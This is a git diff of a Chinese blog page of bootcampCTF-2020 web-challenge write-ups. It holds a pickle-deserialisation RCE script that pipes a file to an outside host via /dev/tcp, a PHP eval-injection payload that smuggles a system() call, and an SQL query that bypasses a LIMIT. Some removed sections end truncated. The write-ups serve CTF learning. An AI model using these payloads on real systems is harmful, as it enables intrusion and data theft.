@@ -464,67 +464,347 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><a href="https://gitlab.com/mctf/quals-2020" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020</a></p>
 <h2 id="bootcampCTF-2020"><a href="#bootcampCTF-2020" class="headerlink" title="bootcampCTF-2020"></a>bootcampCTF-2020</h2><p>做题时简单做的笔记。所以没图。将就看吧</p>
 <h3 id="Find-That-Data"><a href="#Find-That-Data" class="headerlink" title="Find That Data!"></a>Find That Data!</h3><p>整体上是个静态功能。首先登陆界面js中提示存在<code>/maze</code>路由。接下来发现maze.js中定义</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_data</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">1</span> &amp;&amp; y === maxRows) &#123;</span><br><span class="line">    $.post(<span class="string">"/mem"</span>, &#123; <span class="attr">token</span>: $(<span class="string">"#token"</span>).html() &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">      alert(<span class="string">"Memory: "</span> + data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">function check_data() {
+  if (x === 1 &amp;&amp; y === maxRows) {
+    $.post(&quot;/mem&quot;, { token: $(&quot;#token&quot;).html() }).done(function(data) {
+      alert(&quot;Memory: &quot; + data);
+    });
+  }
+}</code></pre>
 <p>post<code>/mem</code>传递<code>token=xxx</code>即可。token通过访问<code>/token</code>即可获得。大概几秒刷新一次。</p>
 <h3 id="Programs-Only"><a href="#Programs-Only" class="headerlink" title="Programs Only"></a>Programs Only</h3><p>实话说真的脑洞。要不是因为想起来国际赛经常有这种python后端放robots.txt的操作我真搞不出来。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Program</span><br><span class="line">Allow: &#x2F;program&#x2F;</span><br><span class="line"></span><br><span class="line">User-agent: Master Control Program 0000</span><br><span class="line">Allow: &#x2F;program&#x2F;control</span><br></pre></td></tr></table></figure>
-<p>改UA访问后一个即可</p>
+<pre><code>User-agent: Program
+Allow: /program/
+
+User-agent: Master Control Program 0000
+Allow: /program/control</code></pre><p>改UA访问后一个即可</p>
 <h3 id="Reindeer-Flotilla"><a href="#Reindeer-Flotilla" class="headerlink" title="Reindeer Flotilla"></a>Reindeer Flotilla</h3><p>flag在加了混淆的js里</p>
 <h3 id="First-Day-Inspection"><a href="#First-Day-Inspection" class="headerlink" title="First Day Inspection"></a>First Day Inspection</h3><p>flag一部分在加了混淆的js里剩下的四处找找就完了。</p>
 <h3 id="EnFlaskCom"><a href="#EnFlaskCom" class="headerlink" title="EnFlaskCom"></a>EnFlaskCom</h3><p>有点意思。给了两个cookie.一个cookie user明显是pickle序列化数据的16进制。不过另一个cookie signature只能看出是256位。不知道算法。</p>
 <p>存在报错，那么可以简单尝试更换cookie爆出部分源码。</p>
 <p>于是疯狂fuzz.开始只单纯更改cookie的数值话，触发报错只能得到部分语句。就是知道他会调用自定义的<code>sign()</code>函数计算user的签名并与cookie中的signature进行assert断言。那么显然需要报错带出sign这个函数的源码。</p>
 <p>显然我们只是更改cookie的值的话,传递结果总是字符串。那么sign函数是不会报错的，自然就不会爆出源码。<br>故将cookie改为数组传递下。就能得到sign源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">def sign(msg):
+    if type(msg) is not bytes:
+        msg = bytes(msg, &#39;utf8&#39;)
+        keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156)
+        signer = pkcs1_15.new(keyPair)
+        hsh = SHA384.new()
+        hsh.update(msg)
+        signature = signer.sign(hsh)
+        return signature</code></pre>
 <p>进而调用pickle RCE即可.本来不想rce的结果发现<code>is_admin()</code>返回True没改成。干脆就直接rce了<br><code>nc -lvkp 9001</code>监听<br>然后<code>bash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;</code>即可。避免弹shell造成干扰。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA384</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""bash -c "cat flag.txt &gt; /dev/tcp/xxx/9001" """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">user=binascii.hexlify(pickle.dumps(e)).decode()</span><br><span class="line">signature=binascii.hexlify(sign(user)).decode()</span><br><span class="line">r = requests.get(<span class="string">'http://chal.ctf.b01lers.com:3000/flag'</span>,cookies=&#123;<span class="string">'user'</span>:user,<span class="string">'signature'</span>:signature&#125;)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+from Crypto.Signature import pkcs1_15
+from Crypto.Hash import SHA384
+from Crypto.PublicKey import RSA
+import binascii
+import pickle
+import os
+
+
+def sign(msg):
+    if type(msg) is not bytes:
+        msg = bytes(msg, &#39;utf8&#39;)
+        keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156)
+        signer = pkcs1_15.new(keyPair)
+        hsh = SHA384.new()
+        hsh.update(msg)
+        signature = signer.sign(hsh)
+        return signature
+
+class exp(object):
+    def __reduce__(self):
+        s = &quot;&quot;&quot;bash -c &quot;cat flag.txt &gt; /dev/tcp/xxx/9001&quot; &quot;&quot;&quot;
+        return (os.system, (s,))
+
+e = exp()
+user=binascii.hexlify(pickle.dumps(e)).decode()
+signature=binascii.hexlify(sign(user)).decode()
+r = requests.get(&#39;http://chal.ctf.b01lers.com:3000/flag&#39;,cookies={&#39;user&#39;:user,&#39;signature&#39;:signature})</code></pre>
 <p>端口即可拿到flag</p>
 <h3 id="Where’s-Tron"><a href="#Where’s-Tron" class="headerlink" title="Where’s Tron?"></a>Where’s Tron?</h3><p>给了源码<br>可以任意sql select语句执行。它唯一的限制就是<code>limit 20</code>所以直接注释掉。在返回的几千条数据中直接找tron。它的某一个列中就是flag</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> programs <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">"^Tron"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">select * from programs where name regexp &quot;^Tron&quot;#</code></pre>
 <h3 id="Next-Gen-Networking"><a href="#Next-Gen-Networking" class="headerlink" title="Next Gen Networking"></a>Next Gen Networking</h3><p>给了源码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">"packet"</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: packet not found&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $raw_packet = $_POST[<span class="string">"packet"</span>];</span><br><span class="line">        $packet = json_decode($raw_packet);</span><br><span class="line">        <span class="keyword">if</span>($packet == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: decoding packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;version != <span class="number">6.5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong packet version&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + <span class="number">64</span>;</span><br><span class="line">        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ihl != $calculated_ihl <span class="keyword">or</span> $packet-&gt;ihl &gt; <span class="number">170</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong header size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;len != strlen($raw_packet)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: mismatched packet size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ttl - <span class="number">1</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: invalid ttl&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ackno != $_COOKIE[<span class="string">"seqno"</span>] + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: out of order packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;algo != <span class="string">"sha256"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $checksum_str = <span class="string">"\$checksum = hash(\"$packet-&gt;algo\", strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));"</span>;</span><br><span class="line">        <span class="keyword">eval</span>($checksum_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;checksum != $checksum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: checksums don't match&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $file_name_hash = hash(<span class="string">"md5"</span>, microtime());</span><br><span class="line">        $file_name = <span class="string">"sent/"</span>.$file_name_hash.<span class="string">".packet"</span>;</span><br><span class="line">        $packet_file = fopen($file_name, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open packet file"</span>);</span><br><span class="line">        fwrite($packet_file, $packet-&gt;data);</span><br><span class="line">        fclose($packet_file);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\""</span>.$file_name.<span class="string">"\"&gt;"</span>.$file_name_hash.<span class="string">".packet&lt;/a&gt;&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Send Packet.&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/style.css"</span>/&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/tron.css"</span>/&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id=<span class="string">"main-wrapper"</span>&gt;</span><br><span class="line">            &lt;div class="content-page"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> get_data(); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+    function get_data() {
+        if(!isset($_POST[&quot;packet&quot;])){
+            return &quot;&lt;p&gt;Error: packet not found&lt;/p&gt;&quot;;
+        }
+
+        $raw_packet = $_POST[&quot;packet&quot;];
+        $packet = json_decode($raw_packet);
+        if($packet == null) {
+            return &quot;&lt;p&gt;Error: decoding packet&lt;/p&gt;&quot;;
+        }
+
+        if($packet-&gt;version != 6.5) {
+            return &quot;&lt;p&gt;Error: wrong packet version&lt;/p&gt;&quot;;
+        }
+
+        $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + 64;
+        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));
+        if($packet-&gt;ihl != $calculated_ihl or $packet-&gt;ihl &gt; 170) {
+            return &quot;&lt;p&gt;Error: wrong header size&lt;/p&gt;&quot;;
+        }
+
+        if($packet-&gt;len != strlen($raw_packet)) {
+            return &quot;&lt;p&gt;Error: mismatched packet size&lt;/p&gt;&quot;;
+        }
+
+        if($packet-&gt;ttl - 1 != 0) {
+            return &quot;&lt;p&gt;Error: invalid ttl&lt;/p&gt;&quot;;
+        }
+
+        if($packet-&gt;ackno != $_COOKIE[&quot;seqno&quot;] + 1) {
+            return &quot;&lt;p&gt;Error: out of order packet&lt;/p&gt;&quot;;
+        }
+
+        if($packet-&gt;algo != &quot;sha256&quot;){
+            return &quot;&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;&quot;;
+        }
+
+        $checksum_str = &quot;\$checksum = hash(\&quot;$packet-&gt;algo\&quot;, strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));&quot;;
+        eval($checksum_str);
+
+        if($packet-&gt;checksum != $checksum) {
+            return &quot;&lt;p&gt;Error: checksums don&#39;t match&lt;/p&gt;&quot;;
+        }
+
+        $file_name_hash = hash(&quot;md5&quot;, microtime());
+        $file_name = &quot;sent/&quot;.$file_name_hash.&quot;.packet&quot;;
+        $packet_file = fopen($file_name, &quot;w&quot;) or die(&quot;Unable to open packet file&quot;);
+        fwrite($packet_file, $packet-&gt;data);
+        fclose($packet_file);
+
+        return &quot;&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\&quot;&quot;.$file_name.&quot;\&quot;&gt;&quot;.$file_name_hash.&quot;.packet&lt;/a&gt;&lt;/div&gt;&quot;;
+    }
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Send Packet.&lt;/title&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot;/&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;/tron.css&quot;/&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;main-wrapper&quot;&gt;
+            &lt;div class=&quot;content-page&quot;&gt;
+                &lt;?php echo get_data(); ?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
 <p>主要就是一个eval可以利用。然后用弱类型绕过属性的要求rce<br>如下:</p>
 <ul>
-<li><code>1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0</code>成立。<br>poc<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$raw_packet = <span class="string">'&#123;"version":6.5,"len":110&#125;'</span>;</span><br><span class="line">$packet=json_decode($raw_packet,<span class="keyword">true</span>);</span><br><span class="line">$packet[<span class="string">"version"</span>] = <span class="number">6.5</span>;</span><br><span class="line">$packet[<span class="string">"ttl"</span>]=<span class="string">"1));?&gt;&lt;?php system('cat /var/www/tron-eval/packets/sent/flag.packet.php');//"</span>;</span><br><span class="line">$packet[<span class="string">"seqno"</span>]=<span class="number">0</span>;</span><br><span class="line">$packet[<span class="string">"ackno"</span>]=<span class="number">1</span>;</span><br><span class="line">$packet[<span class="string">"algo"</span>]=<span class="string">"sha256"</span>;</span><br><span class="line">$calculated_ihl = strlen($packet[<span class="string">"version"</span>]) + strlen(strval($packet[<span class="string">"len"</span>])) + strlen(strval($packet[<span class="string">"ttl"</span>])) + strlen(strval($packet[<span class="string">"seqno"</span>])) + strlen(strval($packet[<span class="string">"ackno"</span>])) + strlen($packet[<span class="string">"algo"</span>]) + <span class="number">64</span>;</span><br><span class="line">$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">$packet[<span class="string">"ihl"</span>]=$calculated_ihl;</span><br><span class="line">$packet[<span class="string">"len"</span>]=strlen(json_encode($packet));</span><br><span class="line">var_dump(json_encode($packet));</span><br></pre></td></tr></table></figure>
-exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://chal.ctf.b01lers.com:3002/packets/send.php'</span></span><br><span class="line">payload=<span class="string">"""&#123;"version":6.5,"len":164,"ttl":"1));?&gt;&lt;?php system('cat \/var\/www\/tron-eval\/packets\/sent\/flag.packet.php');\/\/","seqno":0,"ackno":1,"algo":"sha256","ihl":157&#125;"""</span></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">'packet'</span>:payload&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
+<li><code>1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0</code>成立。<br>poc<pre><code class="php">&lt;?php
+</code></pre>
 </li>
 </ul>
-<h3 id="Derezzy"><a href="#Derezzy" class="headerlink" title="Derezzy"></a>Derezzy</h3><p>有点可惜。其实确实不难的。主要还是没想到它的websocket端口是对外的,有些郁闷。</p>
-<p>首先题目整体上似乎是一个播放功能。然后可用的内容不多。只有一个main.js,用js-beautifyer美化下后看看其中的关键代码。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateServer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.post(<span class="string">"update"</span>, &#123;</span><br><span class="line">        request: <span class="string">"listen"</span>,</span><br><span class="line">        path: <span class="string">"# wait where were my non-dynamic files..../app.lua"</span></span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="string">"success"</span> == b ? <span class="built_in">console</span>.log(<span class="string">"successful update"</span>) : <span class="built_in">console</span>.log(<span class="string">"unsuccessful update"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>得知了update路由与传递的某个参数path提示我们有app.lua.因为是non-dynamic所以就是static静态了。static下有一个files文件夹。可以在里面找到<code>app.lua</code>.</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">      update = <span class="string">"/update"</span></span><br><span class="line">    &#125;] = respond_to(&#123;</span><br><span class="line">      GET = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          render = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span 